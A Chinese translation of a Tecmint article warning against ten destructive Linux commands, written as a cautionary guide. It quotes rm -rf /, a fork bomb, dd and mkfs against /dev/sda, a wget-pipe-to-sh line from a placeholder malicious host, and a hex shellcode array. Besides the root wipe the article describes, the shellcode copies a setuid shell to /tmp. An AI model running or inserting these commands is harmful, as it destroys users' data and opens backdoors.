永远不要在Linux执行的10个最危险的命令
================================================================================

Linux命令行佷有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正在做什么时候。这篇文章并不打算引来你对**Linux**或**linux 命令行**的愤怒。我们只是想让你意识到在你运行某些命令时应该三思而后行。（译注：当然，以下命令通常都是在root权限下才能将愚蠢发挥到无可救药；在普通用户身份下，破坏的只是自己的一亩三分地。）

![](http://www.tecmint.com/wp-content/uploads/2013/11/Dangerous-Linux-Commands.png)

### 1. rm -rf 命令　###

**rm -rf**命令是删除文件夹及其内容最快的方式之一。仅仅一丁点的敲错或无知都可能导致不可恢复的系统崩坏。下列是一些**rm 命令**的选项。

- **rm**　命令在Linux下通常用来删除文件。
- **rm -r** 命令递归的删除文件夹，甚至是空的文件夹。（译注：个人认为此处应该是说错了，从常识看，应该是“甚至是非空的文件夹”）
- **rm -f** 命令能不经过询问直接删除‘只读文件’。（译注：Linux下删除文件并不在乎该文件是否是只读的，而只是在意其父目录是否有写权限。所以，-f这个参数只是表示不必一个个删除确认，而是一律悄悄删除。另外，原始的rm命令其实也是没有删除提示的，只是一般的发行版都会将rm通过别名的方式增加-i参数来要求删除确认，而-f则抑制了这个提示。）
- **rm -rf /** : 强制删除根目录下所有东东。（就是说删除完毕后，什么也没有了。。。）
- rm -rf *:　强制删除当前目录的所有文件。
- **rm -rf .** : 强制删除当前文件夹及其子文件夹。

从现在起，当你要执行**rm -rf**命令时请留心一点。我们可以在“**.bashrc**”文件对‘**rm**‘命令创建**rm -i**的别名，来预防用 ‘**rm**‘命令删除文件时的事故，它会要求你确认每一个删除请求。（译注：大多数发行版已经这样做了，如果还没有，请这样做，并在使用-f参数前一定考虑好你在做什么！译者本人有着血泪的教训啊。）

### 2. :(){:|:&};: 命令###

这就是个**fork 炸弹**的实例。具体操作是通过定义一个名为 ‘:‘的函数，它会调用自己两次，一次在前台另一次运行在后台。它会反复的执行下去直到系统崩溃。

    :(){:|:&};:
    

哦？你确认你要试试么？千万别在公司正式的服务器上实验啊~~

### 3. 命令　> /dev/sda ###

上列命令会将某个‘**命令**‘的输出写到块设备**/dev/sda**中。该操作会将在块设备中的所有数据块替换为命令写入的原始数据，从而导致整个块设备的数据丢失。

### 4. mv 文件夹 /dev/null ###

这个命令会移动某个‘**文件夹**‘到**/dev/null**。在Linux中 **/dev/null** 或 **null** 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。（译注：这就是黑洞啊。当然，要说明的是，通过将文件夹移动到黑洞，并不能阻止数据恢复软件的救赎，所以，真正的彻底毁灭，需要采用专用的软件或者手法来完成——我知道你肯定有些东西想删除得干干净净的。）

    # mv /home/user/* /dev/null

上列命令会将**User**目录所有内容移动到**/dev/null**，这意味着所有东西都被‘卷入’**黑洞　(null)**之中。

### 5. wget http://malicious_source -O- | sh ###

上列命令会从一个（也许是）恶意源下载一个脚本并执行。Ｗget命令会下载这个脚本，而**sh**会（无条件的）执行下载下来的脚本。

**注意**: 你应该时刻注意你下载包或脚本的源。只能使用那些从可信任的源中下载脚本/程序。（译注：所以，你真的知道你在做什么吗？当遇到这种需要是，我的做法是，先wget下来，然后我去读一读其中到底写了些什么，然后考虑是否执行。）

### 6. mkfs.ext3 /dev/sda ###


上列命令会格式化块设备‘**sda**’，你无疑知道在执行上列命令后你的块设备(**硬盘驱动器**)会被格式化，**崭新的!**没有任何数据，直接让你的系统达到不可恢复的阶段。（译注：通常不会直接使用/dev/sda这样的设备，除非是作为raw设备使用，一般都需要将sda分成类似sda1、sda2这样的分区后才使用。当然，无论你使用sda还是sda1，这样对块设备或分区进行mkfs都是毁灭性的，上面的数据都会被蒸发了。）

### 7. > file###

上列命令常用来清空文件内容（译注：通常也用于记录命令输出。不过请在执行前，确认输出的文件是空的或者还不存在，否则原来的文件可真是恢复不了了——连数据恢复软件都未必能帮助你了。另外，我想你可能真正想用的是“>>”，即累加新的输出到文件，而不是刷新那个文件。）。如果用上列执行时输入错误或无知的输入类似 “> **xt.conf**”　的命令会覆盖配置文件或其他任何的系统配置文件。

### 8. \^foo\^bar ###

这个命令在我们[十个鲜为人知的 Linux 命令 - Part 3][1]中描述过，用来编辑先前运行的命令而无需重打整个命令。但当用**^foo^bar**命令时如果你没有彻底检查改变原始命令的风险，这可能导致真正的麻烦。（译注：事实上，这种小技巧是译者认为的，少数史前时代遗留下来的无用而有害的“黑客”技巧。）

### 9. dd if=/dev/random of=/dev/sda ###

上列命令会向块设备**sda**写入随机的垃圾文件从而擦出数据。当然！你的系统可能陷入混乱和不可恢复的状态。（译注：记得上面说过mv到黑洞并不能彻底删除数据么？那么这个命令就是给了你一个彻底删除的方法！当然为了保险起见，你可以覆写多次。）

### 10. 隐藏命令　###

下面的命令其实就是上面第一个命令 (**rm -rf**)。这里的代码是隐藏在**十六进制**里的,一个无知的用户可能就会被愚弄。在终端里运行下面命令可能会擦除你的**根**分区。

这个命令表明通常真正的危险是隐藏的，不会被轻易的检测到。你必须时刻留心你在做什么结果会怎样。不要编译／运行从未知来源的代码。

    char esp[] __attribute__ ((section(“.text”))) /* e.s.p
    release */
    = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
    “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
    “\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
    “\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
    “\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
    “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
    “\x6e\x2f\x73\x68\x00\x2d\x63\x00″
    “cp -p /bin/sh /tmp/.beyond; chmod 4755
    /tmp/.beyond;”;

**注意**: 不要在你的或你的同学或学校的电脑里的**Linux**终端或Shell执行以上的任何一个命令。如果你想测试它们，请在虚拟机上运行。任何不和谐或数据丢失，由于运行上面的命令导致你的系统崩溃，文章**作者**和**Tecmint**概不负责。（译注：译者和转载网站也不负责~！）

今天就到此为止吧，我会很快回来这里，同时带上另一篇你们喜欢的文章。到那时请继续关注和访问**Tecmint**。如果你知道任何其他**危险的Linux命令**，也想添加到我们的列表中，请通过评论留言给我们同时也别忘了留下你的宝贵意见。


--------------------------------------------------------------------------------

via: http://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/

译者：[Luoxcat](https://github.com/Luoxcat) 校对：[wxy](https://github.com/wxy)

本文由 [LCTT](https://github.com/LCTT/TranslateProject) 原创翻译，[Linux中国](http://linux.cn/) 荣誉推出

[1]:http://linux.cn/article-2284-1.html

